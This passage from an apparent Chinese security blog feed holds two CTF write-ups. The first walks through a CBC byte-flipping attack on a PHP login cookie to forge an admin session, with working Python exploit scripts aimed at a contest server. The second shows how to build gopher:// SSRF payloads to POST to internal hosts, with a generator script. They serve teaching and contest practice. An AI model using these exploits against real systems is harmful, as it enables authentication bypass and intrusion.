class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;SECRET_KEY&quot;</span>, file_get_contents(<span class="string">&#x27;/root/key&#x27;</span>));</span><br><span class="line">define(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = get_random_iv();</span><br><span class="line">    <span class="variable">$plain</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = openssl_encrypt(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;iv&quot;</span>, base64_encode(<span class="variable">$iv</span>));</span><br><span class="line">    setcookie(<span class="string">&quot;cipher&quot;</span>, base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = openssl_decrypt(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = unserialize(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.base64_encode(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Flag is $flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span>);</span><br><span class="line">        login(<span class="variable">$info</span>);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;body class=&quot;login-body&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;content&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;footer&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析登录过程中的逻辑，如果username为admin则禁止登陆，若不为admin则进入login，show_homepage()函数。</p><p>如果没有username传入则直接进入check_login()函数和show_homepage()函数</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518150259290.png" class title="image-20210518150259290"><p>当我们使用非admin账户尝试登陆会直接来到login函数，获得iv，plain，cipher的值并将iv，cipher作为set-cookie显示，将username注册为session变量</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518150558203.png" class title="image-20210518150558203"><p>来到show_homepage()，检查session变量，不是admin弹出错误信息。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518151103808.png" class title="image-20210518151103808"><p>在注册iv，cipher值的时候便存在CBC字节翻转攻击了。CBC字节攻击存在于check_login()函数中，想要进入check_login()函数便要使username参数滞空，带着新的cookie进行请求。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518151442330.png" class title="image-20210518151442330"><p>在这一行代码中，进行加密获得序列化数据，这里传入我们更改过的cipher，控制明文，那么$plain就会被破坏，不是一个标准化的序列化数据，那么就会触发报错，使我们得到这个错误的序列化数据，再重新修复iv使得数据能被序列化成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$plain &#x3D; openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)</span><br></pre></td></tr></table></figure><p>cipher翻转脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-03-15 11:45:57</span></span><br><span class="line"><span class="comment"># @Author  : Mr.zhang(s4ad0w.protonmail.com)</span></span><br><span class="line"><span class="comment"># @Link    : http://blog.csdn.net/csu_vc</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">iv_raw=<span class="string">&#x27;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&#x27;</span>  <span class="comment">#这里填写第一次返回的iv值</span></span><br><span class="line">cipher_raw=<span class="string">&#x27;8WdhbPxjZy9xYAgoCeghiOUQu0ri1Y3dv7cX44MbvOfIC6zZxCbR%2FPFpeMatL5qIgT%2BYA66tIdCBpxtWsWxV9Q%3D%3D&#x27;</span>  <span class="comment">#这里填写第一次返回的cipher值</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]原始iv和cipher&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;iv_raw:  &quot;</span> + iv_raw</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cipher_raw:  &quot;</span> + cipher_raw</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]对cipher解码，进行反转&quot;</span></span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line"><span class="comment">#a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;&#125;</span></span><br><span class="line"><span class="comment">#s:2:&#123;s:8:&quot;userna</span></span><br><span class="line"><span class="comment">#me&quot;;s:5:&quot;zdmin&quot;;</span></span><br><span class="line"><span class="comment">#s:8:&quot;password&quot;;s</span></span><br><span class="line"><span class="comment">#:3:&quot;12345&quot;;&#125;</span></span><br><span class="line">xor_cipher = cipher[<span class="number">0</span>:<span class="number">9</span>] +  <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[<span class="number">9</span>]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + cipher[<span class="number">10</span>:]  <span class="comment">#请根据你的输入自行更改，原理看上面的介绍</span></span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;反转后的cipher：&quot;</span> + xor_cipher</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518154302085.png" class title="image-20210518154302085"><p>可以看到现在已经泄露了序列化失败的密文。</p><p>由于此时的密文已经是由我们修改过的，解密后为：</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518155008787.png" class title="image-20210518155008787"><p>可以看到，我们传入的用户名是zdmin，而此时变成了admin。是因为我们修改了cipher的一个字节导致成功控制了明文。可是此时由于更改了cipher而iv值更新导致数据块1损坏。我们需要获得新的iv值。</p><p>由序列化知识可知此处完整的序列化数据应该为：</p><p>a:2:{s:8:”username”;s:5:”admin”;s:8:”password”;s:15:”1SCC_2o2l_KeFuu”;}</p><p>修复脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-03-15 11:56:20</span></span><br><span class="line"><span class="comment"># @Author  : csu_vc(s4ad0w.protonmail.com)</span></span><br><span class="line"><span class="comment"># @Link    : http://blog.csdn.net/csu_vc</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">cipher = <span class="string">&#x27;Bc6oENSSAEPpPdv/rbqRZG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&#x27;</span><span class="comment">#填写提交后所得的无法反序列化密文</span></span><br><span class="line">iv = <span class="string">&#x27;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&#x27;</span><span class="comment">#一开始提交的iv</span></span><br><span class="line"><span class="comment">#cipher = urllib.unquote(cipher)</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = <span class="string">&#x27;&#x27;</span></span><br><span class="line">right = <span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span><span class="comment">#被损坏前正确的明文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    newIv += <span class="built_in">chr</span>(<span class="built_in">ord</span>(right[i])^<span class="built_in">ord</span>(iv[i])^<span class="built_in">ord</span>(cipher[i])) <span class="comment">#这一步相当于把原来iv中不匹配的部分修改过来</span></span><br><span class="line"><span class="built_in">print</span> urllib.quote(base64.b64encode(newIv))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再将修复完成的iv，cipher值发送，即可成功序列化绕过服务器验证直接以admin登录。</p><p>在check_login()完成攻击，session值为admin，在进入show_homepage()得到flag。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518160039464.png" class title="image-20210518160039464"><p>自己写了个利用脚本–python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cipherFilp</span>(<span class="params">cipher,iv</span>):</span></span><br><span class="line">iv_raw=iv</span><br><span class="line">cipher_raw=cipher  </span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line">xor_cipher = cipher[<span class="number">0</span>:<span class="number">9</span>] +  <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[<span class="number">9</span>]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + cipher[<span class="number">10</span>:] </span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line"><span class="keyword">return</span> xor_cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reqeuests_cipher</span>(<span class="params">headers</span>):</span></span><br><span class="line">result = requests.post(<span class="string">&#x27;http://39.96.91.106:8210/&#x27;</span>,headers=headers)</span><br><span class="line">response = result.text.split(<span class="string">&#x27;&lt;p&gt;&#x27;</span>)[<span class="number">1</span>][<span class="number">15</span>:<span class="number">111</span>]</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNewIv</span>(<span class="params">cipher,iv</span>):</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = <span class="string">&#x27;&#x27;</span></span><br><span class="line">right = <span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    newIv += <span class="built_in">chr</span>(<span class="built_in">ord</span>(right[i])^<span class="built_in">ord</span>(iv[i])^<span class="built_in">ord</span>(cipher[i]))</span><br><span class="line"><span class="keyword">return</span> urllib.quote(base64.b64encode(newIv))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span>(<span class="params">result</span>):</span></span><br><span class="line">result = result.split(<span class="string">&#x27;&lt;p&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> result[<span class="number">2</span>][<span class="number">0</span>:<span class="number">34</span>]</span><br><span class="line"></span><br><span class="line">result = requests.post(<span class="string">&#x27;http://39.96.91.106:8210/&#x27;</span>,data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;zdmin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1SCC_2o2l_KeFuu&#x27;</span>&#125;)</span><br><span class="line">cookies = result.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">PHPSESSID = cookies[<span class="number">0</span>][<span class="number">10</span>:<span class="number">36</span>]</span><br><span class="line">iv = cookies[<span class="number">1</span>][<span class="number">4</span>:]</span><br><span class="line">cipher = cookies[<span class="number">2</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Frist cipher is:          &quot;</span> + cipher</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Frist iv is:          &quot;</span> + iv</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">newCipher = cipherFilp(cipher,iv)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Filp cipher is          &quot;</span>+ newCipher</span><br><span class="line">cookiestr = <span class="string">&quot;PHPSESSID=&quot;</span>+PHPSESSID+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;iv=&quot;</span>+iv+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;cipher=&quot;</span>+newCipher</span><br><span class="line">headers[<span class="string">&#x27;cookie&#x27;</span>]=cookiestr</span><br><span class="line">newCipher2 = reqeuests_cipher(headers)</span><br><span class="line"><span class="built_in">print</span> newCipher2</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Serialization failed cipher is           &quot;</span>+ newCipher2</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Serialization data is           &quot;</span> + base64.b64decode(newCipher2)</span><br><span class="line">newIv = getNewIv(newCipher2,iv)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;repair iv is           &quot;</span>+ newIv</span><br><span class="line">headers[<span class="string">&#x27;cookie&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cookiestr = <span class="string">&quot;PHPSESSID=&quot;</span>+PHPSESSID+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;iv=&quot;</span>+newIv+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;cipher=&quot;</span>+newCipher</span><br><span class="line">headers[<span class="string">&#x27;cookie&#x27;</span>] = <span class="built_in">str</span>(cookiestr)</span><br><span class="line">result = requests.get(<span class="string">&#x27;http://39.96.91.106:8210/&#x27;</span>,headers=headers)</span><br><span class="line">getflag(result.text)</span><br></pre></td></tr></table></figure><p>运行结果：可以看到每次变动的iv和cipher，损坏后的序列化数据以及最后的flag。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210519104957964.png" class title="image-20210519104957964">]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ISCC客服一号冲冲冲（二）&quot;&gt;&lt;a href=&quot;#ISCC客服一号冲冲冲（二）&quot; class=&quot;headerlink&quot; title=&quot;ISCC客服一号冲冲冲（二）&quot;&gt;&lt;/a&gt;ISCC客服一号冲冲冲（二）&lt;/h3&gt;&lt;p&gt;考点：CBC字节翻转攻击，bmp隐写&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="-CTF -bmp隐写 -web -CBC字节翻转攻击" scheme="http://example.com/tags/CTF-bmp%E9%9A%90%E5%86%99-web-CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>SSRF gopher协议构造</title>
    <link href="http://example.com/2021/05/13/SSRF-gopher%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0/"/>
    <id>http://example.com/2021/05/13/SSRF-gopher%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0/</id>
    <published>2021-05-13T09:43:01.000Z</published>
    <updated>2021-05-22T02:38:57.546Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF利用中的万能协议gopher"><a href="#SSRF利用中的万能协议gopher" class="headerlink" title="SSRF利用中的万能协议gopher"></a>SSRF利用中的万能协议gopher</h2><p>在一次CTF的SSRF利用中构造gopher协议对内网靶机构造post请求时出现了一些问题导致请求400，而原因大多都是构造出的gopher协议存在编码上的问题，现记录gopher协议构造方法。</p><h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>构造gopher协议请求包，回车换行使用%0d%0a，然后进行url编码后发包。其他与http协议类似。</p><p>下面按照此要求构造一个gopher请求包。</p><p>GOPHER://172.21.0.2:8080/_POST /login HTTP/1.1%0d%0aHost: localhost:1000%0d%0aConnection: close%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aContent-Length: 31%0d%0a%0d%0ausername=admin&amp;password=c9a5d20c9f84</p><p>往172.21.0.2:8080/login下发起post请求。带上必须要的http请求头字段，发起请求。</p><p>GET构造方式与其相似，下面贴上自动生成脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import  urllib.parse</span><br><span class="line">agreement&#x3D;&quot;GOPHER:&#x2F;&#x2F;&quot;</span><br><span class="line">host &#x3D; &quot;172.21.0.2:8080&quot;</span><br><span class="line">path &#x3D; &quot;&#x2F;login&quot;</span><br><span class="line">RequestField &#x3D; &#39;&#39;&#39;</span><br><span class="line">Host:localhost:1000</span><br><span class="line">Connection:close</span><br><span class="line">Content-Type:application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length:31</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">parameter&#x3D;&#39;&#39;&#39;</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admin</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">RequestField &#x3D; RequestField.split(&#39;\n&#39;)</span><br><span class="line">RequestField.pop(0)</span><br><span class="line">RequestField.pop(len(RequestField) - 1)</span><br><span class="line">def payload(method):</span><br><span class="line">    if method &#x3D;&#x3D; &#39;post&#39;:</span><br><span class="line">        payload &#x3D; agreement+host+&#39;&#x2F;_POST &#39;+path + &#39; HTTP&#x2F;1.1&#39;</span><br><span class="line">        for Filed in RequestField:</span><br><span class="line">            payload &#x3D; payload+&#39;%0d%0a&#39;+Filed</span><br><span class="line">        payload &#x3D; payload + &quot;%0d%0a%0d%0a&quot; + parameter</span><br><span class="line">        print(urllib.parse.quote(payload.replace(&#39;\n&#39;,&#39;&#39;)))</span><br><span class="line">    if method &#x3D;&#x3D; &#39;get&#39;:</span><br><span class="line">        payload &#x3D; agreement+host+&#39;&#x2F;_GET &#39;+path+&#39;?&#39;+parameter+&#39; HTTP&#x2F;1.1&#39;</span><br><span class="line">        for Filed in RequestField:</span><br><span class="line">            payload &#x3D; payload + &#39;%0d%0a&#39; + Filed</span><br><span class="line">        print(urllib.parse.quote(payload.replace(&#39;\n&#39;,&#39;&#39;)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload(&#39;post&#39;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
